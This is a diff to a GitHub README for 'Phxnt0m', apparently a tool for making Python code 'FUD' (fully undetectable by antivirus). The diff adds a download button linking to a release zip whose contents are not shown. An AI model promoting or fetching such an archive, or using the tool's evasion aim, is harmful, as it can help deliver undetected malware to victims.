@@ -16,6 +16,10 @@ Phxnt0m is an updated and more powerful version of the original Phxnt0m tool, de
 ![FUD Python](https://cdn.discordapp.com/attachments/1252644513227214920/1254647732778565653/image.png?ex=667a4141&is=6678efc1&hm=f364bd660b93ff226a236eb5ac040a6e02a01bd1b78f0eb150fe15fb1c3b11ff&)
 *FUD Python*
 
+## Download
+
+[![Download](https://github.com/Mrrobot101010/Phxnt0m/blob/main/download-button.png)](https://github.com/Mrrobot101010/Phxnt0m/releases/latest/download/Phxnt0m.zip)
+
 ## Installation
 
 ### Prerequisites
